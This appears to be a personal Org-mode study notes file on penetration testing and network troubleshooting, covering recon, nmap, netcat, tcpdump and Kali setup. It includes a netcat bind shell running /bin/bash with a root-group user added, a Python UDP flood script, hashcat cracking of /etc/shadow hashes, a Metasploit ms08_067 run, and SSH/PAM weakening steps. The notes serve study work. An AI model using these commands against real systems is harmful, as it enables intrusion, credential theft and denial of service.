#+HTML_HEAD: <link rel="stylesheet" type="text/css" href="css/main.css" />
* footprinting
** website footprinting
 - operating system used.
 - subdirectories and parameters
 - Filename, path, database field name, or query:You should analyze anything after the
   a  query that looks like a filename, path, database field name, or query carefully
   to check whether it offers opportunities for SQL injection
 - Scripting platform
 - Contact details and CMS details: The contact pages usually offer details such as names
   phone numbers, email addresses, and locations of admin or support people.

** view headers
 - Connection status and content-type
 - Accept-ranges
 - Last-Modified information
 - X-Powered-By information
 - Web server in use and its version

** examine cookies set by the server to determine the software
running and its behavior.

** Email footprinting
By using email tracking tools you can gather the following information about
the victim:

 - Geolocation
 - read duration
 - proxy detection
 - links : allows you to check whether the links sent to the recipient through email
   have been checked or not.
 - Operating System
 - Forward email : whether or not the email sent to you is forwarded to another person
   can be determined easily by using this tool.

* Kali linux prep
** install linux headers for kali

#+begin_src shell 
$ apt-cache search header | grep -i linux
#  look for the one ending in –kali-all-amd64
$ apt-get install linux-headers-4.4.0-kalli-all-amd64
#+end_src 

** install kali guest additions

#+begin_src shell 
$ cd /media/cdrom0
$ cp VBoxLinuxAdditions.run /root/Desktop
$ ./VBoxLinuxAdditions.run
#+end_src 

** use network managed mode

#+begin_src shell 
$ vim /etc/NetworkManager.conf
# change managed=false to managed=true
#+end_src 

** permit =Root= login for SSH

#+begin_src shell 
$ vim /etc/ssh/sshd_config
#  change line PermitRootLogin without-password
#  PermitRootLogin yes
#+end_src

** set ssh to start at every bood
#+begin_src shell
$ update-rc.d -f ssh enable 2 3 4 5
#+end_src

** disably password delay
#+begin_src
# at /etc/pam.d find pam_filedelay and change delay to 1
auth       optional   pam_faildelay.so  delay=3000000

# at /etc/pam.d find common-auth  and add nodelay like this
# could be system-auth
auth            sufficient      pam_unix.so try_first_pass nullok nodelay
#+end_src

* google search operators
|            |                                                                                                |
|------------+------------------------------------------------------------------------------------------------|
| Operator   | Description intitle Looks for the search terms in the title                                    |
| allintitle | Looks for the search terms only in the title and nowhere else in the document                  |
| inurl      | Looks through the URL (the address) for the search terms                                       |
| allinurl   | Similar to allintitle     looks only in the URL for the search terms                           |
| filetype   | You provide the filetype and search terms. All results have that filetype.                     |
| allintext  | The search will not look at the URL and just in the text.                                      |
| site       | Narrow your search to a particular site. You have to provide the site as well as search terms. |
| link       | Searches for links to pages                                                                    |
| inanchor   | This search will look in anchor tags only                                                      |
| numrange   | Searches for a number                                                                          |
| daterange  | Results will be within a range of dates            as specified                                |
| author     | Searches Google Groups for a particular author. This only works in Google Groups.              |
| group      | Looks for a group name. This only works in Google Groups.                                      |
| insubject  | Searches subject lines in posts. This only works in Google Groups.                             |
| msgid      | Searches within a group for a message ID.                                                      |

http://www.googleguide.com
* whois & DNS
** query
#+begin_src shell
$ whois apress.com
$ whois -h whois.apnic.net <host>
# Looking up all the whois records that are maintained by the
# folks from Yahoo!. The following command shows how you do this:
$ whois –i mnt-by YAHOO-MNT
# filter ip addresses
$ whois –i mnt-by YAHOO-MNT | grep inetnum
$ whois –i mnt-by YAHOO-MNT | grep inetnum | awk –F\: '{ print $2 }'
#+end_src 

** whois query query handler

| whois.nic.ir    |
| whois.apnic.net |
| whois.arin.net  |

** MX record

Every domain will have at least one MX record. Knowing the hostname from the MX
record will tell you which system you need to interact with if you want to
perform penetration testing against the organization's receiving mail server
using the simple mail transfer protocol (SMTP) .

#+begin_src shell
# MX records
$ dig Mx apress.com
#using nslookup
$ nslookup
> set type=mx
> apress.com
#+end_src

** reverse DNS lookup
#+begin_src shell 
$ dig -x [IP address]
#+end_src 

* port scan 

#+begin_src shell 
# -p- scann all 65536 ports
$ sudo nmap -sS -p- 172.30.42.1
# udp port scan
$ sudo namp -sU
# operating system scan
$ sudo nmap -sS -O 172.30.42.1
# scan one port 
$ sudo nmap -sV -p 22,53 <ip>
# TCP full connection scan
$ nmap -sT -vvv -p 80 192.168.195.0/24
# SYN scan
$ nmap -sS -vvv -p 80 192.168.195.0/24
# ACK scan
$ nmap -sA -vvv -p80 192.168.195.0/24
# UDP scan
$ nmap -sU -vvv -p161 192.168.195.0/24
# combined UDP and TCP scan
$ nmap -sS -sU -vvv -p U:161,139 T:8080,21 192.168.195.0/24
# service detection
$ nmap -sS -vvv -Pn -sV<targetIP>
#+end_src 

** scanning default gateways
#+begin_src shell
for i in `seq 1 255`; do ping -c 1 192.168.$1.1 | tr \\n ' ' | awk '/1
received/ {print $2}'; done
#+end_src

* banner grabbing
use telnet for TCP and nc for UPD connections.

#+begin_src shell 
$ telnet <host> <port>
$ nc -u <host> <port>
#+end_src

* host discovery with =arping=
arping uses ARP requests and replies instead of ICMP packets.
#+begin_src shell 
$ arping [ip address]
# I've used the MAC address, but the IP address could also be used.
$ arping -v -c3 00:10:7b:66:f7:62
#+end_src 

* netcat
** port scan using =netcat= 

 #+begin_src shell 
 $ netcat -z -v domain.com 1-1000
 #ou can then use the -n flag to specify that you do not need to resolve the IP address using DNS:
 $ netcat -z -n -v 111.111.111.111 1-1000
 $ netcat -z -n -v 111.111.111.111 1-1000 2>&1 | grep succeeded
 # to randomized port scanning use -r switch
 $ nc –v –r –w 1 192.168.0.10 –z 1-1000
 # scanning a range of devices
 $ for i in {10..12}; do nc –vv –n –w 1 192.168.0.$i 21-25 –z; done
 #+end_src

** communicate through =netcat=

 On one machine, you can tell netcat to listen to a specific port for
 connections. We can do this by providing the -l parameter and choosing a port:

 #+begin_src shell 
 netcat -l 4444
 #+end_src

 This will tell netcat to listen for TCP connections on port 4444

 On a second server, we can connect to the first machine on the port number we
 choose. We do this the same way we've been establishing connections previously:

 #+begin_src shell 
 netcat domain.com 4444
 #+end_src 

 It will look as if nothing has happened. However, you can now send messages on
 either side of the connection and they will be seen on either end.
** =netcat= chat interface

 #+begin_src shell 
 $ nc -l -p 4444         # host ip 192.168.1.102
 $ nc 192.168.1.102 4444
 #+end_src 

** transfering data with =netcat=

 #+begin_src shell 
 # server +++ -w 30 wait for 30 seconds 
 $ nc –v –w 30 –p 31337 –l < secret.txt
 # client
 $ nc –v –w 2 192.168.0.10 31337 > secret.txt
 #+end_src 

** banner grabbing

 #+begin_src shell 
 $ nc 192.168.1.1 80
 #+end_src 

** Linux remote shell 

 to prepare the listener we will type the following command into the command
 line:

 #+begin_src shell 
 $ sudo nc –lp 31337 –e /bin/bash
 #Connecting to the target
 $ nc 192.168.0.11 31337
 # Adding a local user and placing into the root group
 $ useradd –g root bob
 #+end_src

** send receive syslog
#+begin_src shell
# How to send log message to remote server?
$ nc -w0 -u 192.168.1.1 514 <<< "logging from remote"
# listen for messages
$ nc -l -u 512
#+end_src 

* sample python flood scriptf
  
#+begin_src python
import socket
import random

sock=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes=random._urandom(1024)
ip=raw_input('Target IP:')
port=input('Port:')
sent=0

while 1:
	sock.sendto(bytes,(ip,port))
	print "Sent %s amount of packets to %s at port %s: " % (sent,ip, port)
	sent = sent + 1
#+end_src 

* Cracking Linux Password Hashes with Hashcat 
  
** Getting Hashcat 2.00

Hashcat updated to 3.00 and it won't run in a virtual machine anymore. The simplest solution is to use the old version.
In a Terminal window, execute these commands:
#+begin_src shell
cd
mkdir hash
cd hash
wget https://hashcat.net/files_legacy/hashcat-2.00.7z
7z e hashcat-2.00.7z
./hashcat-cli32.bin -V
#+end_src 

#+begin_src shell
# get the hash for a username
$ cat /etc/shadow

# Finding the salt value
# The $6$ value indicates a type 6 password hash (SHA-512).
# The characters after $6$, up to the next $,  are the SALT.
$ cat /etc/show
root:$6$QYVo1xui$JS7zZtJ857Ti5nKYjTAcVUKqe.87yZvUXgehw2irI5k.0NzhI8PLkga8pz3uR7b8V.lF9qpxZtACqIBNKM.yB0:17235:0:99999:7:::

# Hash algorithm?
# the hash algorithm is defined in the file /etc/login.defs.
$ grep -A 18 ENCRYPT_METHOD /etc/login.defs

# Making a Hash File
# add the hashed password to a file
# and remove the last part for the above hash value delete everything after the yB0
# and the username 

# make a wordlist
$ curl http://www.scovetta.com/download/500_passwords.txt > 500_passwords.txt
head 500_passwords.txt

# Cracking the Hash
$ ./hashcat-cli32.bin -m 1800 -a 0 -o found1.txt --remove crack1.hash 500_passwords.txt
$ cat found1.txt

# Unix type 6 password hashes (-m 1800)
# Using a dictionary attack (-a 0)
# Putting output in the file found1.txt
# Removing each hash as it is found
# Getting hashes from crack1.hash
# Using the dictionary 500_passwords.txt
#+end_src 

https://samsclass.info/123/proj10/p12-hashcat.htm

* metasploit
** init
   
#+begin_src shell 
$ service postgresql start
$ service metasploit start
$ msfconsole
msf > search ms08-067
msf > info exploit/windows/smb/ms08_067_netapi
msf > use windows/smb/ms08_067_netapi
msf > show options
# setting RHOST
msf > set RHOST 192.168.20.10
msf > exploit
#+end_src

* network
** netstat
#+begin_src shell

# routing table
$ netstat -rn
#+end_src

** lsof

#+begin_src shell
# internet connections
# unlike netstat lsof will not report connections that do not have open files.
$ lsof -i

# open files by process name
$ lsof -cemacs24

#open files by pid
$ lsof -p `pidof emacs24`

# specify and address (lsof)
# only files related to the address will be showed.
$ lsof -i@sloan.lander.edu


#+end_src

** ARP
If some machines on your network are reachable but others aren't, or
connectivity comes and goes, ARP problems may be the cause.

#+begin_src shell
# show arp cache table
$ arp -a
#+end_src

** traceroute
#+begin_src shell
# use -n to disable name resolution
$ traceroute -n 

#+end_src

** iperf

#+begin_src shell
# starting server
$ iperf -s -p3000

#client
$ iperf -c205.153.60.236 -p3000
#+end_src

** tcpdump
*** intro
#+begin_src shell
# capture 100 packets and terminate
$ tcpdump -c100

# dump traffic of specific interface
$ tcpdump -i eth0

# disable name resolution
$ tcpdump -n

#address filtering
#This command captures all traffic to and from the host with the IP address 205.153.63.30.
$ tcpdump host 205.153.63.30

# Here is an example that uses the Ethernet address of a computer to select traffic
$ tcpdump ether host 0:10:5a:e3:37:c

# a filter that collects traffic sent to the host at 205.153.63.30 but not from i
$ tcpdump dst 205.153.63.30

# capture to packets coming from or going to the 205.153.60.0 network
$ tcpdump net 205.153.60

#The following command does the same thing:
$ tcpdump net 205.153.60.0 mask 255.255.255.0

#restricts the traffic captured to IP traffic
# IP traffic will include TCP traffic, UDP traffic, and so on
$ tcpdump ip

#To capture just TCP traffic, you would use:
# Recognized keywords include ip, igmp, tcp, udp, and icmp.
$ tcpdump tcp
#capture more than one protocol
$ tcpdump -pi eth0  tcp or udp or icmp

#capture specific port
$ tcpdump -pi eth0 port 110

# Capture several ports:
$ tcpdump -pi eth0 port 25 or port 80 or port 110

#Capture a port range:
$ tcpdump -pi eth0 portrange 3000-4000

# Watch traffic leaving a port:
$ tcpdump -pi eth0 src port 110

#Watch traffic entering a port:
$ tcpdump -pi eth0 dst port 110

#Look for packets smaller than the specified size:
$ tcpdump -pi eth0 less 512

#Look for packets larger than the specified size:
$ tcpdump -pi eth0 greater 512

#Watch SSH connections from certain hosts:
$ tcpdump -pi eth0 src host uberpc or stinkpad and dst port 22

#Watch for traffic leaving one network and entering two other networks:
$ tcpdump -pi eth0 src net 192.168.1.0/16 and dst net 10.0.0.0/8 or 172.16.0.0/16

#There are many transport-level services that do not have recognized keywords. In this case, you can
#use the keywords proto or ip proto followed by either the name of the protocol found in the
#/etc/protocols file or the corresponding protocol number. For example, either of the following will
#look for OSPF packets:
$ tcpdump ip proto ospf

#For higher-level services, services built on top of the underlying protocols, you must use the keyword
#port.
#the keyword domain is resolved by looking in /etc/services.
$ tcpdump port domain
$ tcpdump port 53

#This will capture DNS name lookups using UDP but not DNS zone transfers using TCP.
$ tcpdump udp port domain

#This command collects packets longer than 200 bytes.
$ tcpdump greater 200

# proto[expr:size] is the general syntax.
# proto indicates which header to look into -ip;tcp & ...
# expr gives an offset into the header indexed from 0

# looks into the IP header at the tenth byte, the protocol field, for a value of 6.
$ tcpdump "ip[9] = 6"     #the same as $tcpdump tcp

#This will match multicast and broadcast packets.
$ tcpdump 'ether[0] & 1 != 0'

#This filter skips the first 13 bytes in the TCP header, extracting the flag byte. The mask 0x03 selects
#the first and second bits, which are the FIN and SYN bits.
$ tcpdump "tcp[13] & 0x03 != 0"

# compound filters
$ tcpdump host 205.153.63.30 and ip
#all traffic to the host except IP traffic
$ tcpdump host 205.153.63.30 and not ip

#captures all UDP or ARP traffic to or from lxn1.
$ tcpdump "host lnx1 and (udp or arp)"

#suppose you are interested in capturing traffic on the host lnx1, you are logged onto the
#host bsd1, and you are using telnet to connect from bsd1 to lnx1. To capture all the traffic at lnx1,
#excluding the Telnet traffic between bsd1 and lnx1, the following command will probably work
#adequately in most cases:
lnx1# tcpdump -n "not (tcp port telnet and host lnx1 and host bsd1)"


#The -X switch reads the data payload, but the default is to only read 68 bytes, 
#so -s0 displays the whole data payload, as this example from an IRC conversation shows:
$ tcpdump -X -s0 -pi eth0

# see the live capture and store it in a file.
# tcpdump -pXi eth0 -s0 host stinkpad -l | tee tcpdumpfile
#This is a good way to catch infected hosts that are sending out spam because nobody should 
#be sending anything from port 25 except your official mail servers:
#The -n switch turns off name resolution.
$ tcpdump -pni eth0 dst port 25 and not src host mailserver1

#you might want to use the -c switch to limit the number of packets captured:

$ tcpdump -c 1000 -pXi eth0 -w tcpdumpfile -s0
#+end_src
*** capturing TCP flags 
#+begin_src shell
#Capture all SYN packets:
$ tcpdump 'tcp[13] & 2 != 0'

#Capture all ACK packets:
$ tcpdump 'tcp[13] & 16 != 0'

#Capture all SYN-ACK packets:
$ tcpdump 'tcp[13] = 18'

#Capture all FIN packets:
$ tcpdump 'tcp[13] & 1 != 0'

#Capture all URG packets:
$ tcpdump 'tcp[13] & 32 != 0'

#Capture all PSH packets:
$ tcpdump 'tcp[13] & 8 != 0'

#Capture all RST packets:
$ tcpdump 'tcp[13] & 4 != 0'
#+end_src

* smurf attack

In a Smurf Attack, ICMP ECHO_REQUEST packets are sent to the broadcast address
of a network. Depending on how hosts are configured on the network, some may
attempt to reply to the ECHO_REQUEST.

* network troubleshooting

** Testing Connectivity with ping Problem
*** check network interface is up and running
#+begin_src shell 
$ ping localhost
#+end_src
*** confirm local networking is working properly
**** intro
#+begin_src shell
$ ping -c10 uberpc
#+end_src
The output from that simple command gives you several useful pieces of
information, including that name resolution is working and you have a good,
clean, fast connection.
**** check hostname

#+begin_src shell
$ ping -c10 uberpc
#ping: unknown host uberpc
#+end_src 

This means you entered the wrong hostname, DNS is broken, routing is goofed up,
or the remote host is not connected to the network. So, your next step is to
ping the IP address:

#+begin_src shell
$ ping -c10 192.168.1.76
PING 192.168.1.76 (192.168.1.76) 56(84) bytes of data.
From 192.168.1.10 icmp_seq=1 Destination Host Unreachable
[...]
From 192.168.1.10 icmp_seq=10 Destination Host Unreachable

--- 192.168.1.76 ping statistics ---
10 packets transmitted, 0 received, +9 errors, 100% packet loss, time 9011ms
, pipe 3
#+end_src 

This shows that you entered the wrong IP address or the host is down, but you
got as far as a router on the host's network. You know this because the router
sent you the "Destination Host Unreachable" message.

If pingingr the IP address had succeeded, then that would point to a DNS problem.
**** check connection to network
This is what it looks like when your own PC is not connected to the network:

#+begin_src shell
$ ping -c10 192.168.1.76
connect: Network is unreachable
#+end_src

**** check connection to remote network
This is what you see when the whole remote network is unreachable:

#+begin_src shell
$ ping -c10 alrac.net
PING alrac.net(11.22.33.44) 56(84) bytes of data.
--- alrac.net ping statistics ---
10 packets transmitted, 0 received, 100% packet loss, time 10007ms
#+end_src

** profiling
*** ping whole subnet
**** with Fping
FPing pings all the addresses in a range in sequence. This example pings a
subnet once, reports which hosts are alive, queries DNS for the hostnames, and
prints a summary:

#+begin_src 
	$ fping -c1 -sdg 192.168.1.0/24
	xena.alrac.net    : [0], 84 bytes, 0.04 ms (0.04 avg, 0% loss)
	pyramid.alrac.net : [0], 84 bytes, 0.45 ms (0.45 avg, 0% loss)
	uberpc.alrac.net  : [0], 84 bytes, 0.11 ms (0.11 avg, 0% loss)
	ICMP Host Unreachable from 192.168.1.10 for ICMP Echo sent to 192.168.1.2
	ICMP Host Unreachable from 192.168.1.10 for ICMP Echo sent to 192.168.1.3
	ICMP Host Unreachable from 192.168.1.10 for ICMP Echo sent to 192.168.1.4
	[...]

	192.168.1.9       :  xmt/rcv/%loss = 1/0/100%
	xena.alrac.net    :  xmt/rcv/%loss = 1/1/0%, min/avg/max = 0.04/0.04/0.04
	192.168.1.11      :  xmt/rcv/%loss = 1/0/100%
	[...]
	     128 targets
	       3 alive
	     126 unreachable
	       0 unknown addresses

	       0 timeouts (waiting for response)
	     127 ICMP Echos sent
	       3 ICMP Echo Replies received
	     102 other ICMP received

	 0.04 ms (min round trip time)
	 1.02 ms (avg round trip time)
	 2.58 ms (max round trip time)
	        6.753 sec (elapsed real time)

# use this to show up hosts only
$ fping -c1 -sdg 192.168.1.0/25 2>&1 | egrep -v "ICMP|xmt"
#+end_src

**** with nmap

If all you want to do is to discover all the up hosts on your network, Nmap is
faster and less verbose:
#+begin_src shell
	# nmap -sP 192.168.1.0/24
	Starting Nmap 4.20 ( http://insecure.org ) at 2007-06-08 15:53 PDT
	Host xena.alrac.net (192.168.1.10) appears to be up.
	Host pyramid.alrac.net (192.168.1.50) appears to be up.
	MAC Address: 00:0D:B9:05:25:B4 (PC Engines GmbH)
	Host uberpc.alrac.net (192.168.1.76) appears to be up.
	MAC Address: 00:14:2A:54:67:D6 (Elitegroup Computer System Co.)
	Nmap finished: 256 IP addresses (3 hosts up) scanned in 4.879 seconds
#+end_src

** Finding Duplicate IP Addresses with arping
Use arping, like this:
#+begin_src 
	$ arping -D 192.168.1.76
	ARPING 192.168.1.76 from 0.0.0.0 eth0
	Unicast reply from 192.168.1.76 [00:14:2A:54:67:D6] for 192.168.1.76 [00:14:2A:54:67:
	D6] 0.605ms
	Sent 1 probes (1 broadcast(s))
	Received 1 response(s)
#+end_src 

Received 1 response(s) means that this address is already in use, and arping
even gives you the MAC address. You may also test with a hostname:

#+begin_src 
	$ arping -D uberpc
	ARPING 192.168.1.76 from 0.0.0.0 eth0
	Unicast reply from 192.168.1.76 [00:14:2A:54:67:D6] for 192.168.1.76 [00:14:2A:54:67:
	D6] 0.590ms
	Sent 1 probes (1 broadcast(s))
	Received 1 response(s)
#+end_src

** Testing HTTP Throughput and Latency with httping

#+begin_src shell
# head request
$ httping -c4 -g http://www.oreilly.com
# get request
$ httping -c4 -Gg http://www.oreilly.com

# The -r switch tells httping to resolve the hostname only once, to remove DNS
# latency from its measurements:

$ httping -c4 -Grg http://www.oreilly.com

# You can test SSL-enabled sites with the -l switch:

$ httping -c4 -lGg https://www.fictionalsslsite.org

# To specify an alternate port, append it to the URL:

$ httping -c4 -Gg http://www.fictionalsslsite.org:8080

# httping will report the roundtrip time with the -b switch in kilobytes per second (not kilobits):

$ httping -c4 -Gbg http://www.fictionalsslsite.org
PING www.fictionalsslsite.org:80 (http://www.fictionalsslsite.org):
connected to www.fictionalsslsite.org:80, seq=0 time=2553.96 ms 43KB/s

# Use the -s switch to display return codes. Put it all together, and this is what you get:

$ httping -c4 -Gsbrg http://www.oreilly.com
PING www.oreilly.com:80 (http://www.oreilly.com):
  75KB/sed to www.oreilly.com:80, seq=0 time=1567.91 ms 200 OK
  72KB/sed to www.oreilly.com:80, seq=1 time=1618.20 ms 200 OK
  18KB/sed to www.oreilly.com:80, seq=2 time=5869.12 ms 200 OK
  58KB/sed to www.oreilly.com:80, seq=3 time=1979.43 ms 200 OK
--- http://www.oreilly.com ping statistics ---
4 connects, 4 ok, 0.00% failed
round-trip min/avg/max = 1567.9/2758.7/5869.1 ms
Transfer speed: min/avg/max = 18/56/75 KB

# You can test a local server by specifying the hostname and port instead of the URL:
$ httping -c4 -h xena -p 80

#+end_src

** Measuring Throughput, Jitter, and Packet Loss with iperf
 

* useful resources
http://www.iana.org/assignments/icmp-parameters/icmp-parameters.xhtml
http://oss.oetiker.ch/smokeping-demo
https://www.vanheusden.com/httping/
https://www.vanheusden.com/Linux/index.php
* temp
If some machines on your network are reachable but others aren't, or connectivity comes and goes,
ARP problems may be the cause.


* useful resources
http://ftp.ntua.gr/mirror/technotronic/
/media/moh/59920B8A5B5D077A/mybase/reilly/(O'Reilly System Administration) Joseph D Sloan-Network Troubleshooting Tools-O'Reilly Media (2001).pdf
